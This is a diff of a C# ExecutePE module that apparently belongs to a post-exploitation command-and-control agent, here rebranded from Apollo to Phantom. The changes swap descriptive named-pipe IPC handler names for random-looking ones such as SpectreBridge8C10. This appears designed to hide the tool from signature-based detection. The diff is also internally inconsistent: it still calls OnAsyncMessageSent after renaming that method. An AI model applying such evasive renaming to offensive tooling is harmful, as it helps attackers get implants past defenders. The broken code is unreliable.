@@ -3,15 +3,15 @@ using System.Collections.Generic;
 using System.Text;
 using System.Linq;
 using System.Threading;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using System.Collections.Concurrent;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Constants;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Enums.PhantomEnums;
+using PhantomInterop.Constants;
 using ST = System.Threading.Tasks;
 using System.IO.Pipes;
 using ExecutePE.Helpers;
@@ -61,7 +61,7 @@ namespace ExecutePE
                     pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                 }
 
-                // Wait for all messages to be read by Apollo
+                // Wait for all messages to be read by Phantom
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
@@ -170,7 +170,7 @@ namespace ExecutePE
             }
             return return_code;
         }
-        private static void OnBufferWrite(object sender, StringDataEventArgs args)
+        private static void RobustEngine12EA(object sender, StringDataEventArgs args)
         {
             if (args.Data != null)
             {
@@ -178,13 +178,13 @@ namespace ExecutePE
                 _senderEvent.Set();
             }
         }
-        private static void OnAsyncMessageSent(IAsyncResult result)
+        private static void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
             pipe.Flush();
         }
-        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        private static void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
@@ -199,7 +199,7 @@ namespace ExecutePE
             MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        private static void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -215,7 +215,7 @@ namespace ExecutePE
             _receiverEvent.Set();
         }
 
-        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public static void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_clientConnectedTask != null)
